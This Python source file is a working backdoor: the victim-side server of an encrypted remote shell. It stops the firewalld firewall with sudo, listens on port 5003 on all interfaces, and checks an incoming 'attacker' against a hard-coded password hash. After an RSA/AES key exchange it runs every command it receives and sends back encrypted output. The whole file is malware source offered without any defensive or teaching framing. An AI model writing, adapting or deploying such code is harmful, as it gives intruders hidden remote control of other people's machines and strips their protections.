import socket
import os
import subprocess
import sys
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes

try:
    subprocess.call(['sudo', 'systemctl', 'stop', 'firewalld'])
    print("Firewall stopped successfully.")
except subprocess.CalledProcessError as e:
    print("Error stopping firewall:", e)

SERVER_HOST = "0.0.0.0"  # Listen on all available interfaces
SERVER_PORT = 5003
BUFFER_SIZE = 1024 * 128  # 128KB max size of messages, feel free to increase
SEPARATOR = "<sep>"
s = socket.socket()
s.bind((SERVER_HOST, SERVER_PORT))
s.listen(5)
print("Listening as {}:{}".format(SERVER_HOST, SERVER_PORT))

# Hash the password
hashed_password = "1662198d30fef98b6ce2f4f3519136a7ac6eb71994373fa4453a3844ae963413"

while True:
    attacker, attacker_address = s.accept()
    print("{}:{} Connected!".format(attacker_address[0], attacker_address[1]))

    # Receive the hashed password from the client
    attacker_password = attacker.recv(BUFFER_SIZE).decode()

    # Check if the received hashed password matches the locally hashed password
    if attacker_password != hashed_password:
        attacker.close()
        continue
    
    # Generate an RSA key pair for asymmetric encryption
    victim_private_key = RSA.generate(2048)
    victim_public_key = victim_private_key.publickey()

    # Send the server's public key to the attacker
    transfer_public_key = victim_public_key.export_key()
    attacker.send(transfer_public_key)

    # get attacker public key
    attacker_public_key = attacker.recv(BUFFER_SIZE)

    #print("attacker:", attacker_public_key)
    #print("victim:", victim_public_key.export_key())
    
    # AT THIS POINT, I HAVE BOTH PUBLIC KEYS

    # get symmetric key from attacker
    enc_symmetric_key = attacker.recv(BUFFER_SIZE)
    victim_cipher = PKCS1_OAEP.new(victim_private_key)
    symmetric_key = victim_cipher.decrypt(enc_symmetric_key)


    #print(symmetric_key)
    # AT THIS POINT THE SYMMETRIC KEYS MATCH

    sym_cipher = AES.new(symmetric_key, AES.MODE_EAX)

    # send the initial cwd
    message = os.getcwd().encode()
    ciphertext, tag = sym_cipher.encrypt_and_digest(message)
    #print(ciphertext,tag, sym_cipher.nonce)
    attacker.send(ciphertext + SEPARATOR.encode() + tag + SEPARATOR.encode() + sym_cipher.nonce)



    while True:
        command = attacker.recv(BUFFER_SIZE)
        ciphertext, tag, nonce = command.split(SEPARATOR.encode())
        next_sym_cipher = AES.new(symmetric_key, AES.MODE_EAX, nonce)
        plaintext = next_sym_cipher.decrypt_and_verify(ciphertext, tag).decode()
        splitted_command = plaintext.split()

        if plaintext.lower() == "exit":
            break
        if splitted_command[0].lower() == "cd":
            try:
                os.chdir(' '.join(splitted_command[1:]))
            except (OSError, IOError) as e:
                output = str(e).encode()
            else:
                output = str("").encode()
        else:
            try:
                output = subprocess.check_output(splitted_command, stderr=subprocess.STDOUT)
            except subprocess.CalledProcessError as e:
                output = e.output
            except Exception as e:
                output = str(e).encode()

        cwd = os.getcwd()
        message = output + SEPARATOR.encode() + cwd.encode()
        next_sym_cipher = AES.new(symmetric_key, AES.MODE_EAX)
        ciphertext, tag = next_sym_cipher.encrypt_and_digest(message)
        attacker.send(ciphertext + SEPARATOR.encode() + tag + SEPARATOR.encode() + next_sym_cipher.nonce)

    attacker.close()